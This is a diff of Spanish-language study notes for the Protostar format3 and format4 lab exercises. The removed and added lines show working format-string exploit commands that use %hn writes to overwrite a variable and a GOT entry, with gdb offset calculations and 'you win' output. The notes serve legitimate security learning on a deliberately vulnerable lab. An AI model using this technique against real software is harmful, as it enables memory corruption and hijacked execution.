@@ -225,38 +225,7 @@ $1 = 16930112
 [user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08" + "%16930112x%12$n")' | ./format3 | tail -n1
 you have modified the target :)
 ```
-## Extra -> en vez de escribir los 4 bytes, escribimos de 2 en 2
 
-```console
-[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08\xf6\x96\x04\x08" + "%12$hn" + "%13$hn")' | ./format3 ;echo 
-�� target is 00080008 :(
-```
-Aui hemos puesto dos dierecciones de memoria, la primera es la de la varaible target (la misma que con 4 bytes) y la segunda es la misma pero sumando 2-> 0x080496f4 y 0x080496f6) Es decir, dos memorias para escribir 2 bytes en cada una (mitad del valor la varaible para una mitad para la otra en vez de todo para una como antes). Como ya tenemos dos argumentos en vez de uno pues %12 y %13. Y en h es para lo de escribir dos bytes.
-
-```console
-[user@protostar]-[/opt/protostar/bin]:$ gdb
-(gdb) p 0x0102 - 0x0008
-$1 = 250
-[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08\xf6\x96\x04\x08" + "%250x%12$hn" + "%13$hn")' | ./format3 ;echo 
-target is 01020102 :(
-```
-El primer byte son 0102 y el segundo tambiennos ha escrito eso, pero tiene que ser "01025544" asi que nos falta un poco para llegar, veamos cuanto:
-
-```console
-[user@protostar]-[/opt/protostar/bin]:$ gdb
-(gdb) p 0x5544 - 0x0102 
-$1 = 21570
-[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08\xf6\x96\x04\x08" + "%250x%12$hn" + "%21570x%13$hn")' | ./format3 | tail -n1
-target is 55440102 :(
-```
-Vaya, resulta ser que nos ha salido al reves (quizas no hemos tenido en cuenta el tema del endian que da la vuelta a todo) asi que cuando trabajemos con dos bytes hay que poner o las memorias al reves o los argumentos al reves.
-
-```console
-[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf4\x96\x04\x08\xf6\x96\x04\x08" + "%250x%13$hn" + "%21570x%12$hn")' | ./format3 | tail -n1
-you have modified the target :)
-[user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\xf6\x96\x04\x08\xf4\x96\x04\x08" + "%250x%12$hn" + "%21570x%13$hn")' | ./format3 | tail -n1
-you have modified the target :)
-```
 ## Extra -> en vez de escribir los 4 bytes, escribimos de 1 en 1
 
 Ahora como escribimos un byte por memoria, escribimos 4 memorias  (0x080496f4, f5, f6 y f7) Pero como no hay parejas de dos bytes que se cambien, pueden ir en el orden bueno
@@ -404,27 +373,28 @@ Continuing.
 (gdb) x/x 0x8049724 -> Pero ahora en vez de eso tenemos que en la GOT hemos escrito "0x4"
 0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x00000004
 ```
-Usaremos el truco de antes de las memorias de 2 bytes
+Vamos a escribir de dos en dos bytes, para ello la memoria es la original mas otra que suma 2 -> "0x8049724 y 0x8049726"
+\x24\x97\x04\x08\x26\x97\x04\x08\. 
 
 ```console
 [user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\x24\x97\x04\x08\x26\x97\x04\x08\%4$hn%5$hn")' > /tmp/pattern
 user@protostar]-[/opt/protostar/bin]:$ gdb ./format4
 (gdb) break * 0x0804850f
+(gdb) p &hello -> Nos imprimimos la direccion de hello por si se nos habia olvidado
+$16 = (void (*)(void)) 0x80484b4 <hello>
 (gdb) run < /tmp/pattern
 x/x 0x8049724
 0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x00090009
-(gdb) print 0x84b4 - 0x0009
-$15 = 33963
+(gdb) print 0x84b4 - 0x0009   -> Restamos la segunda mitad de la dir de hello() con lo que nos sale
+$15 = 33963 -> Esto es lo que le pondremos al primer argumento
 [user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\x24\x97\x04\x08\x26\x97\x04\x08\%33963x%4$hn%5$hn")' > /tmp/pattern
 (gdb) run < /tmp/pattern
 (gdb) x/x 0x8049724
-0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x84b484b4
-(gdb) p &hello
-$16 = (void (*)(void)) 0x80484b4 <hello>
-(gdb) print 0x0804 - 0x84b4
-$17 = -31920
+0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x84b484b4 -> Ahora este es el GOT, pero no es el bueno, todavia nos queda un poco
+(gdb) print 0x0804 - 0x84b4 -> Lo que nos debe salir (primera mitad - lo que nos sale)
+$17 = -31920 -> Sale negativo, asi que le añadimos un bit a la izquierda
 (gdb) print 0x10804 - 0x84b4
-$19 = 33616
+$19 = 33616 -> Esto es para el segundo argumento (el primero se queda como antes)
 [user@protostar]-[/opt/protostar/bin]:$ python -c 'print("\x24\x97\x04\x08\x26\x97\x04\x08\%33963x%4$hn%33616x%5$hn")' | ./format4
 code execution redirected! you win
 ```
